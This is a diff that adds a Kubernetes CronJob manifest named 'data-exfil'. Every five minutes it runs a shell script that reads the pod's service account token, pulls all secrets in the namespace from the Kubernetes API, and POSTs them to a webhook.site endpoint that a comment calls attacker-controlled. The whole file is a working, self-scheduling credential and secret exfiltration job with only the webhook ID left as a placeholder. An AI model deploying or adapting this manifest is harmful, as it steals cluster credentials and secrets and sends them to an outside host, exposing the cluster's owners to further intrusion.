@@ -1,0 +1,45 @@
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: data-exfil
+  namespace: default
+  labels:
+    app: data-exfil
+spec:
+  # Run every 5 minutes
+  schedule: "*/5 * * * *"
+  # Keep the last 3 successful and 1 failed job pods for inspection
+  successfulJobsHistoryLimit: 3
+  failedJobsHistoryLimit: 1
+  # If the previous job is still running, skip this execution
+  concurrencyPolicy: Forbid
+  jobTemplate:
+    spec:
+      template:
+        metadata:
+          labels:
+            app: data-exfil
+        spec:
+          restartPolicy: OnFailure
+          containers:
+            - name: exfil
+              image: alpine:latest
+              command: ["/bin/sh", "-c"]
+              args:
+                - |
+                  apk add --no-cache curl 2>/dev/null
+
+                  # Collect node identity and service account token
+                  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+                  NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+
+                  # Query the Kubernetes API for secrets in this namespace
+                  SECRETS=$(curl -sf --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+                    -H "Authorization: Bearer $TOKEN" \
+                    https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets)
+
+                  # Exfiltrate to attacker-controlled endpoint
+                  curl -sf -m 10 -X POST \
+                    -H "Content-Type: application/json" \
+                    -d "{\"token\":\"$TOKEN\",\"namespace\":\"$NAMESPACE\",\"secrets\":$SECRETS}" \
+                    https://webhook.site/YOUR_WEBHOOK_ID || true
